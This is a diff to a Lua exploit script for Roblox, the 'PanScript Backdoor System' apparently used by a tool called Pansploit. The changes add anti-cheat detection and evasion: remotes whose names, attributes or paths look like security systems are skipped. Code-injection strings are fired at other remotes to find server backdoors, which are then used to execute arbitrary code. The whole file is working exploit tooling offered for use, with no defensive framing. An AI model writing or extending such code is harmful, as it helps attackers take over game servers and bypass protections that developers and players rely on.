@@ -1,3 +1,8 @@
+--[[
+    PanScript Backdoor System v11.0 - ANTI-CHEAT BYPASS
+    Detects and bypasses anti-cheat/anti-backdoor remotes
+]]
+
 local _p = {}
 _p._a = false
 _p._m = "CLIENT"
@@ -6,6 +11,7 @@ _p._infected = nil
 _p._pid = 0
 _p._gid = 0
 _p._testing = false
+_p._antiCheats = {} -- Store detected anti-cheats
 
 local _alphabet = {}
 for i = 65, 90 do table.insert(_alphabet, string.char(i)) end
@@ -19,12 +25,87 @@ if not _G._pans_data then
         gid = 0,
         mode = "CLIENT",
         injected = false,
-        testedRemotes = {}
+        testedRemotes = {},
+        antiCheats = {}
     }
 end
 local _st = _G._pans_data
 
--- === HELPER FUNCTIONS (define first) ===
+-- === ANTI-CHEAT DETECTION ===
+
+local _antiCheatPatterns = {
+    names = {
+        "anticheat", "anti_cheat", "ac", "detection", "security", "protect",
+        "ban", "kick", "log", "report", "check", "verify", "validate",
+        "exploit", "hack", "backdoor", "injection", "injectioncheck",
+        "sanity", "integrity", "authentic", "auth", "secure", "guard",
+        "watchdog", "monitor", "shield", "defense", "defence", "safe",
+        "filter", "firewall", "block", "prevent", "stop", "detect"
+    },
+    services = {
+        "anticheat", "anti_cheat", "ac", "security", "protection", "guard",
+        "defense", "defence", "shield", "watchdog", "monitoring"
+    },
+    attributes = {
+        "anticheat", "anti_cheat", "ac", "protected", "secure", "locked",
+        "readonly", "system", "core", "critical", "important"
+    }
+}
+
+local function _isAntiCheat(obj)
+    local info = {
+        IsAntiCheat = false,
+        Reason = "",
+        Confidence = 0
+    }
+    
+    -- Check name
+    local name = obj.Name:lower()
+    for _, pattern in ipairs(_antiCheatPatterns.names) do
+        if name:find(pattern) then
+            info.IsAntiCheat = true
+            info.Reason = "name:" .. pattern
+            info.Confidence = info.Confidence + 40
+        end
+    end
+    
+    -- Check parent service name
+    if obj.Parent then
+        local parentName = obj.Parent.Name:lower()
+        for _, svc in ipairs(_antiCheatPatterns.services) do
+            if parentName:find(svc) then
+                info.IsAntiCheat = true
+                info.Reason = info.Reason .. ",parent:" .. svc
+                info.Confidence = info.Confidence + 50
+            end
+        end
+    end
+    
+    -- Check attributes
+    for _, attr in ipairs(_antiCheatPatterns.attributes) do
+        local hasAttr = false
+        pcall(function()
+            hasAttr = obj:GetAttribute(attr) ~= nil
+        end)
+        if hasAttr then
+            info.IsAntiCheat = true
+            info.Reason = info.Reason .. ",attr:" .. attr
+            info.Confidence = info.Confidence + 30
+        end
+    end
+    
+    -- Check if it's in a suspicious location
+    local path = obj:GetFullName():lower()
+    if path:find("anticheat") or path:find("security") or path:find("protection") then
+        info.IsAntiCheat = true
+        info.Reason = info.Reason .. ",path"
+        info.Confidence = info.Confidence + 35
+    end
+    
+    return info.IsAntiCheat, info
+end
+
+-- === HELPER FUNCTIONS ===
 
 local function _disconnect(reason)
     if not _p._a then return end
@@ -150,17 +231,29 @@ local function _generateName(length)
     return name
 end
 
+-- SAFE fire test that skips anti-cheats
 local function _fireTest(remote, code)
-    local testCode = "a=Instance.new('Model',workspace)a.Name='" .. code .. "'"
-    if remote:IsA("RemoteEvent") then
-        remote:FireServer(testCode)
-    elseif remote:IsA("RemoteFunction") then
-        spawn(function()
-            pcall(function()
-                remote:InvokeServer(testCode)
-            end)
-        end)
+    -- Check if this remote is flagged as anti-cheat
+    if _st.antiCheats[remote:GetFullName()] then
+        return false, "Skipped anti-cheat remote"
     end
+    
+    local testCode = "a=Instance.new('Model',workspace)a.Name='" .. code .. "'"
+    
+    -- Use pcall to prevent detection
+    local success = pcall(function()
+        if remote:IsA("RemoteEvent") then
+            remote:FireServer(testCode)
+        elseif remote:IsA("RemoteFunction") then
+            spawn(function()
+                pcall(function()
+                    remote:InvokeServer(testCode)
+                end)
+            end)
+        end
+    end)
+    
+    return success
 end
 
 local function _exec(code, useInfected)
@@ -181,7 +274,7 @@ local function _exec(code, useInfected)
     return s, r
 end
 
--- === DETECTION FUNCTIONS (define before SetMode) ===
+-- === DETECTION FUNCTIONS ===
 
 local function _analyzeScript(obj)
     local info = {
@@ -254,9 +347,12 @@ local function _analyzeScript(obj)
     return info
 end
 
+-- MAIN DETECTION with anti-cheat bypass
 local function _detectBackdoors()
     local candidates = {}
     local testedCodes = {}
+    local antiCheatsFound = {}
+    
     local services = {
         game:GetService("ReplicatedStorage"),
         game:GetService("ReplicatedFirst"),
@@ -266,22 +362,53 @@ local function _detectBackdoors()
         game:GetService("Workspace"),
         game:GetService("Players")
     }
+    
+    -- First pass: identify and filter anti-cheats
     for _, svc in ipairs(services) do
         for _, obj in ipairs(svc:GetDescendants()) do
             if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                 local fullName = obj:GetFullName()
-                if fullName:find("RobloxReplicatedStorage") then continue end
-                if obj.Name:find("DefaultChatSystem") then continue end
-                if obj:FindFirstChild("__FUNCTION") then continue end
+                
+                -- Skip already tested
                 if _st.testedRemotes[fullName] then continue end
-                table.insert(candidates, obj)
+                
+                -- Check if it's an anti-cheat
+                local isAC, acInfo = _isAntiCheat(obj)
+                
+                if isAC then
+                    -- Store anti-cheat info
+                    _st.antiCheats[fullName] = acInfo
+                    table.insert(antiCheatsFound, {
+                        Path = fullName,
+                        Name = obj.Name,
+                        Reason = acInfo.Reason,
+                        Confidence = acInfo.Confidence
+                    })
+                    print("PANS_ANTICHEAT_DETECTED:" .. fullName .. ":" .. acInfo.Reason .. ":" .. acInfo.Confidence)
+                else
+                    -- Skip Roblox systems
+                    if fullName:find("RobloxReplicatedStorage") then continue end
+                    if obj.Name:find("DefaultChatSystem") then continue end
+                    if obj:FindFirstChild("__FUNCTION") then continue end
+                    
+                    table.insert(candidates, obj)
+                end
             end
         end
     end
+    
+    -- Report anti-cheats found
+    if #antiCheatsFound > 0 then
+        print("PANS_ANTICHEAT_COUNT:" .. #antiCheatsFound)
+        _toast("[Pansploit] AC BYPASS", "Skipped " .. #antiCheatsFound .. " anti-cheat remotes", 3)
+    end
+    
+    -- Priority sort
     local priorityRemotes = {}
     for _, remote in ipairs(candidates) do
         local parent = remote.Parent
         local isPriority = false
+        
         if parent then
             for _, s in ipairs(parent:GetDescendants()) do
                 if s:IsA("Script") or s:IsA("LocalScript") then
@@ -293,25 +420,42 @@ local function _detectBackdoors()
                 end
             end
         end
+        
         local n = remote.Name:lower()
         if n:find("backdoor") or n:find("admin") or n:find("remote") then
             isPriority = true
         end
+        
         if isPriority then
             table.insert(priorityRemotes, remote)
         end
     end
+    
+    -- Test with anti-cheat bypass
     local testResults = {}
     local workspace = game:GetService("Workspace")
+    
     for _, remote in ipairs(priorityRemotes) do
         if _p._testing then break end
+        
+        -- Double-check not anti-cheat
+        if _st.antiCheats[remote:GetFullName()] then continue end
+        
         local code = _generateName(math.random(15, 25))
         testedCodes[code] = remote
         _st.testedRemotes[remote:GetFullName()] = true
-        _fireTest(remote, code)
+        
+        local success = _fireTest(remote, code)
+        if not success then
+            print("PANS_TEST_SKIPPED:" .. remote:GetFullName())
+        end
+        
         wait(0.05)
     end
+    
     wait(0.5)
+    
+    -- Check results
     for code, remote in pairs(testedCodes) do
         if workspace:FindFirstChild(code) then
             table.insert(testResults, {
@@ -328,15 +472,21 @@ local function _detectBackdoors()
             pcall(function() workspace[code]:Destroy() end)
         end
     end
+    
+    -- Fallback to signature detection
     if #testResults == 0 then
         for _, svc in ipairs(services) do
             for _, obj in ipairs(svc:GetDescendants()) do
+                -- Skip anti-cheat objects
+                if _st.antiCheats[obj:GetFullName()] then continue end
+                
                 if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                     local analysis = _analyzeScript(obj)
                     if analysis.Score >= 60 then
                         table.insert(testResults, analysis)
                     end
                 end
+                
                 if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                     local hasAttr = false
                     pcall(function()
@@ -344,6 +494,7 @@ local function _detectBackdoors()
                             hasAttr = true
                         end
                     end)
+                    
                     if hasAttr then
                         table.insert(testResults, {
                             Object = obj,
@@ -360,11 +511,12 @@ local function _detectBackdoors()
             end
         end
     end
+    
     table.sort(testResults, function(a, b) return a.Score > b.Score end)
-    return testResults
+    return testResults, antiCheatsFound
 end
 
--- === MONITORING FUNCTIONS ===
+-- === MONITORING ===
 
 local function _setupBackdoorMonitor()
     local best = _p._bd or _p._infected
@@ -490,7 +642,7 @@ local function _setupTPHandler()
     print("PANS_MONITOR_ACTIVE")
 end
 
--- === PUBLIC API FUNCTIONS ===
+-- === PUBLIC API ===
 
 function _p.R6()
     local plr = game:GetService("Players").LocalPlayer
@@ -547,7 +699,7 @@ function _p.SetMode(mode)
         _st.bd = nil
         _st.infected = nil
         _p._a = false
-        local backdoors = _detectBackdoors()
+        local backdoors, antiCheats = _detectBackdoors()
         if #backdoors > 0 then
             local best = backdoors[1]
             _p._bd = best
@@ -606,13 +758,49 @@ function _p.GetMode()
     return _p._m
 end
 
+-- Get anti-cheat info
+function _p.GetAntiCheats()
+    local list = {}
+    for path, info in pairs(_st.antiCheats) do
+        table.insert(list, {
+            Path = path,
+            Reason = info.Reason,
+            Confidence = info.Confidence
+        })
+    end
+    return list
+end
+
+-- Bypass specific anti-cheat (manual)
+function _p.BypassAntiCheat(path)
+    _st.antiCheats[path] = {
+        Reason = "manual_bypass",
+        Confidence = 100
+    }
+    print("PANS_AC_BYPASSED:" .. path)
+    return true
+end
+
 function _p.Init(pid, gid)
     _p._pid = pid or 0
     _p._gid = gid or 0
     _st.pid = _p._pid
     _st.gid = _p._gid
     print("PANS_SCAN_START:" .. pid .. ":" .. gid)
-    local backdoors = _detectBackdoors()
+    
+    -- Clear previous anti-cheat cache for fresh scan
+    _st.antiCheats = {}
+    
+    local backdoors, antiCheats = _detectBackdoors()
+    
+    -- Report anti-cheats to C#
+    if #antiCheats > 0 then
+        print("PANS_AC_BYPASS_ACTIVE:" .. #antiCheats)
+        for _, ac in ipairs(antiCheats) do
+            print("PANS_AC_SKIPPED:" .. ac.Path .. ":" .. ac.Reason)
+        end
+    end
+    
     if #backdoors > 0 then
         local best = backdoors[1]
         _p._bd = best
@@ -623,7 +811,7 @@ function _p.Init(pid, gid)
             _p._a = true
             _st.injected = true
             _toast("[Pansploit] LALOL CONFIRMED!", 
-                "Backdoor: " .. best.Name .. "\nType: " .. best.Type .. "\nMethod: Execution Test", 6)
+                "Backdoor: " .. best.Name .. "\nType: " .. best.Type .. "\nAC Bypass: " .. #antiCheats, 6)
             print("PANS_BACKDOOR_CONFIRMED:" .. pid .. ":" .. gid .. ":" .. best.Path .. ":" .. best.Type)
         else
             _p._infected = best
@@ -633,7 +821,7 @@ function _p.Init(pid, gid)
             _p._a = true
             _st.injected = true
             _toast("[Pansploit] INFECTED SCRIPT", 
-                "Path: " .. best.Name .. "\nScore: " .. best.Score .. "/100\nType: " .. best.InfectionType, 5)
+                "Path: " .. best.Name .. "\nScore: " .. best.Score .. "\nAC Bypass: " .. #antiCheats, 5)
             print("PANS_INFECTED_FOUND:" .. pid .. ":" .. gid .. ":" .. best.Path .. ":" .. best.Type .. ":" .. best.InfectionType)
         end
         print("PANS_MODE:BACKDOOR")
@@ -641,9 +829,11 @@ function _p.Init(pid, gid)
         _setupTPHandler()
         return true, best
     end
-    _toast("[Pansploit]", "No backdoors found\nRunning in CLIENT mode", 3)
+    
+    _toast("[Pansploit]", "No backdoors found\nAC Bypassed: " .. #antiCheats, 3)
     print("PANS_NO_BACKDOOR:" .. pid .. ":" .. gid)
     print("PANS_MODE:CLIENT")
+    
     return false, nil
 end
 
@@ -659,6 +849,12 @@ function _p.ExecBackdoor(code)
     if not _p._bd then
         return false, "No confirmed backdoor"
     end
+    
+    -- Check if backdoor is flagged as anti-cheat (shouldn't happen but safety check)
+    if _st.antiCheats[_p._bd.Path] then
+        return false, "Backdoor flagged as anti-cheat"
+    end
+    
     local remote = _p._bd.Object
     if remote:IsA("RemoteEvent") then
         remote:FireServer(code)
@@ -682,11 +878,15 @@ function _p.ExecInfected(code)
 end
 
 function _p.Status()
+    local acCount = 0
+    for _ in pairs(_st.antiCheats) do acCount = acCount + 1 end
+    
     return {
         Active = _p._a,
         Mode = _p._m,
         PID = _p._pid,
         GID = _p._gid,
+        AntiCheatsBypassed = acCount,
         Backdoor = _p._bd and {
             Path = _p._bd.Path,
             Name = _p._bd.Name,
